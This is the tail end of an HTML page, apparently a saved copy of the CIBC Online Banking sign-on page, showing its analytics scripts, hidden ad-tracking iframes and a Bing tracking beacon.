            var getVar = _satellite.getVar || {}; if ("object" == typeof digitalData.events && digitalData.events.formView) { var formStartTime = (new Date).getTime(); _satellite.cookie.set("formStartTime", formStartTime, { domain: getVar("root_domain") }) } else if ("object" == typeof digitalData.events && digitalData.events.formSubmit) { var formCompleteTime = (new Date).getTime(), formName = getVar("digitalData_form_name"); _satellite.cookie.set("formCompleteTime", formCompleteTime, { domain: getVar("root_domain") }); formStartTime = _satellite.cookie.get("formStartTime"); if (null != formName && "" != formName && null != formStartTime && "" != formStartTime) { var formTimeToComplete = Math.round((formCompleteTime - formStartTime) / 1e3); _satellite.setVar("formTimeToComplete", formTimeToComplete), _satellite.logger.log("The form process took " + formTimeToComplete + " seconds, or about " + Math.round(formTimeToComplete / 60) + " minutes"), _satellite.cookie.remove("formStartTime"), _satellite.cookie.remove("formCompleteTime") } } else _satellite.logger.log(""); var pageVar = { time_stamp: getVar("gtag_ga_time_stamp"), system_cancel_count: parseInt(getVar("events_system_cancelled")) || void 0, page_view_count: parseInt(getVar("events_pageView")) || void 0, info_message_id: getVar("digitalData_info_message_id") || void 0, info_msg_view_count: parseInt(getVar("events_info_message_view")) || void 0, visits_referrer: getVar("visit_referrer") || void 0, internal_site_referrer: getVar("digitalData_page_referrer") || void 0, form_name: getVar("digitalData_form_name") || void 0, form_step_name: getVar("digitalData_form_step_name") || void 0, form_step_count: parseInt(getVar("events_form_step")) || void 0, form_view: parseInt(getVar("events_form_view")) || void 0, form_qualify_count: parseInt(getVar("events_form_qualify")) || void 0, form_prefill_method: getVar("digitalData_prefill_method") || void 0, form_prefill_count: parseInt(getVar("events_form_prefill")) || void 0, form_submit_count: parseInt(getVar("events_form_submit")) || void 0, transaction_id: getVar("digitalData_transaction_ID") || void 0, form_time_to_complete: formTimeToComplete, transaction_amount: parseFloat(getVar("digitalData_transaction_amount")) || void 0, transaction_fee: parseFloat(getVar("digitalData_transaction_fees")) || void 0, funds_in: parseFloat(getVar("digitalData_transaction_amount_in")) || void 0, funds_out: parseFloat(getVar("digitalData_transaction_amount_out")) || void 0, funds_circulated: parseFloat(getVar("digitalData_transaction_amount_circulated")) || void 0, transaction_from_to: getVar("digitalData_transaction_from_to_frequency") || void 0, transaction_currency: getVar("digitalData_transaction_currency") || void 0, transaction_complete: parseInt(getVar("events_transaction_complete")) || void 0, supplemental_id: getVar("digitalData_supplemental_ID") || void 0, transaction_units: parseInt(getVar("digitalData_transaction_units")) || void 0, targeted_offer_details: getVar("digitalData_target_offer_final") || void 0, lead_count: parseInt(getVar("events_lead")) || void 0, page_services: getVar("page_services") || void 0 }, pageCall = Object.assign(_satellite.getVar("ga4-global-variables"), pageVar); gtag("event", "page_view", pageCall);
        });</script><iframe allow="join-ad-interest-group" data-tagging-id="DC-8205542" data-load-time="1715419458681"
        height="0" width="0"
        src="https://td.doubleclick.net/td/fls/rul/activityi;fledge=1;src=8205542;npa=0;auiddc=970252350.1714936533;ps=1;pcor=84355821;uaa=x86;uab=64;uafvl=Chromium%3B124.0.6367.201%7CGoogle%2520Chrome%3B124.0.6367.201%7CNot-A.Brand%3B99.0.0.0;uamb=0;uam=;uap=Windows;uapv=10.0.0;uaw=0;pscdl=noapi;frm=0;gtm=45fe4580v9181624128za200;gcs=G111;gcd=13t3t3t3t5;dma=0;epver=2;~oref=https%3A%2F%2Fwww.cibconline.cibc.com%2Febm-resources%2Fonline-banking%2Fclient%2Findex.html?"
        style="display: none; visibility: hidden;"></iframe><iframe allow="join-ad-interest-group"
        data-tagging-id="AW-997008455" data-load-time="1715419459421" height="0" width="0"
        src="https://td.doubleclick.net/td/rul/997008455?random=1715419459356&amp;cv=11&amp;fst=1715419459356&amp;fmt=3&amp;bg=ffffff&amp;guid=ON&amp;async=1&amp;gtm=45be4580v879733548za200&amp;gcd=13t3t3t3t5&amp;dma=0&amp;u_w=1366&amp;u_h=768&amp;url=https%3A%2F%2Fwww.cibconline.cibc.com%2Febm-resources%2Fonline-banking%2Fclient%2Findex.html&amp;hn=www.googleadservices.com&amp;frm=0&amp;tiba=Sign%20on%20%7C%20CIBC%20Online%20Banking&amp;npa=0&amp;pscdl=noapi&amp;auid=970252350.1714936533&amp;uaa=x86&amp;uab=64&amp;uafvl=Chromium%3B124.0.6367.201%7CGoogle%2520Chrome%3B124.0.6367.201%7CNot-A.Brand%3B99.0.0.0&amp;uamb=0&amp;uam=&amp;uap=Windows&amp;uapv=10.0.0&amp;uaw=0&amp;fledge=1&amp;data=event%3Dgtag.config"
        style="display: none; visibility: hidden;"></iframe><iframe allow="join-ad-interest-group"
        data-tagging-id="AW-997008455" data-load-time="1715419459485" height="0" width="0"
        src="https://td.doubleclick.net/td/rul/997008455?random=1715419459450&amp;cv=11&amp;fst=1715419459450&amp;fmt=3&amp;bg=ffffff&amp;guid=ON&amp;async=1&amp;gtm=45be4580v879733548za200&amp;gcd=13t3t3t3t5&amp;dma=0&amp;u_w=1366&amp;u_h=768&amp;url=https%3A%2F%2Fwww.cibconline.cibc.com%2Febm-resources%2Fonline-banking%2Fclient%2Findex.html&amp;hn=www.googleadservices.com&amp;frm=0&amp;tiba=Sign%20on%20%7C%20CIBC%20Online%20Banking&amp;npa=0&amp;pscdl=noapi&amp;auid=970252350.1714936533&amp;uaa=x86&amp;uab=64&amp;uafvl=Chromium%3B124.0.6367.201%7CGoogle%2520Chrome%3B124.0.6367.201%7CNot-A.Brand%3B99.0.0.0&amp;uamb=0&amp;uam=&amp;uap=Windows&amp;uapv=10.0.0&amp;uaw=0&amp;fledge=1&amp;data=event%3Dpage_view%3Bsite_section%3Dolb%3Bpage_name%3Dcibc%3Eolb%3Esignon%3Bpage_language%3Den%3Bpage_accessibility%3Dpage-accessibility-available%3Bsite_version%3D5.0.2%3A2024-5-1%3Aolb%3Aresponsive%3Bcode_version%3DOnline%20Banking%20(Vue%20JS%20%7C%20MVG%20%7C%20Alloy)%7Cproduction%7C2024.5.9%3Bauth_type%3Dnot-authenticated%3Buser_type%3Dna%3Bpage_view_count%3D1%3Binternal_site_referrer%3Dhttps%3A%2F%2Fwww.cibconline.cibc.com%2Febm-resources%2Fonline-banking%2Fclient%2Findex.html%23%2Fauth%2Fsignon%3Btransaction_currency%3DCAD"
        style="display: none; visibility: hidden;"></iframe><iframe allow="join-ad-interest-group"
        data-tagging-id="AW-997008455" data-load-time="1715419459547" height="0" width="0"
        src="https://td.doubleclick.net/td/rul/997008455?random=1715419459511&amp;cv=11&amp;fst=1715419459511&amp;fmt=3&amp;bg=ffffff&amp;guid=ON&amp;async=1&amp;gtm=45be4580v879733548za200&amp;gcd=13t3t3t3t5&amp;dma=0&amp;u_w=1366&amp;u_h=768&amp;url=https%3A%2F%2Fwww.cibconline.cibc.com%2Febm-resources%2Fonline-banking%2Fclient%2Findex.html&amp;hn=www.googleadservices.com&amp;frm=0&amp;tiba=Sign%20on%20%7C%20CIBC%20Online%20Banking&amp;npa=0&amp;pscdl=noapi&amp;auid=970252350.1714936533&amp;uaa=x86&amp;uab=64&amp;uafvl=Chromium%3B124.0.6367.201%7CGoogle%2520Chrome%3B124.0.6367.201%7CNot-A.Brand%3B99.0.0.0&amp;uamb=0&amp;uam=&amp;uap=Windows&amp;uapv=10.0.0&amp;uaw=0&amp;fledge=1&amp;data=event%3Dview_promotion%3Bsite_section%3Dolb%3Bpage_name%3Dcibc%3Eolb%3Esignon%3Bpage_language%3Den%3Bpage_accessibility%3Dpage-accessibility-available%3Bsite_version%3D5.0.2%3A2024-5-1%3Aolb%3Aresponsive%3Bcode_version%3DOnline%20Banking%20(Vue%20JS%20%7C%20MVG%20%7C%20Alloy)%7Cproduction%7C2024.5.9%3Bauth_type%3Dnot-authenticated%3Buser_type%3Dna%3Blocation_id%3Dsignon-anchor%2Csignon-rotating"
        style="display: none; visibility: hidden;"></iframe>
    <script>_satellite["_runScript6"](function (event, target, Promise) {
            var getVar = _satellite.getVar || {}, x = digitalData.advertising, items = []; for (let o = 0; o < x.length; o++) { var promotionObj = {}; promotionObj.promotion_id = x[o].trackingCode, promotionObj.promotion_name = x[o].type, promotionObj.location_id = x[o].location, items.push(promotionObj) } var adObj = _satellite.getVar("ga4-global-variables"); adObj.items = items, gtag("event", "view_promotion", adObj);
        });</script>
    <div id="batBeacon891740272688" style="width: 0px; height: 0px; display: none; visibility: hidden;"><img
            id="batBeacon54919116922" width="0" height="0" alt=""
            src="https://bat.bing.com/action/0?ti=5175562&amp;Ver=2&amp;mid=5568aea2-6d1b-4bca-aff4-96f59ae5893d&amp;sid=de4482f00f3511efb205314259cda2d9&amp;vid=d93134100b1311ef91b69bb3b7ab6cfe&amp;vids=0&amp;msclkid=N&amp;uach=pv%3D10.0.0&amp;pi=918639831&amp;lg=fr-FR&amp;sw=1366&amp;sh=768&amp;sc=24&amp;tl=Sign%20on%20%7C%20CIBC%20Online%20Banking&amp;p=https%3A%2F%2Fwww.cibconline.cibc.com%2Febm-resources%2Fonline-banking%2Fclient%2Findex.html%23%2Fauth%2Fsignon&amp;r=&amp;lt=25654&amp;evt=pageLoad&amp;sv=1&amp;rn=116530"
            style="width: 0px; height: 0px; display: none; visibility: hidden;"></div>
</body><iframe id="MMhGuHtXIfUJBU8M" style="display: none;"></iframe>
<div style="display: none;"></div>

</html>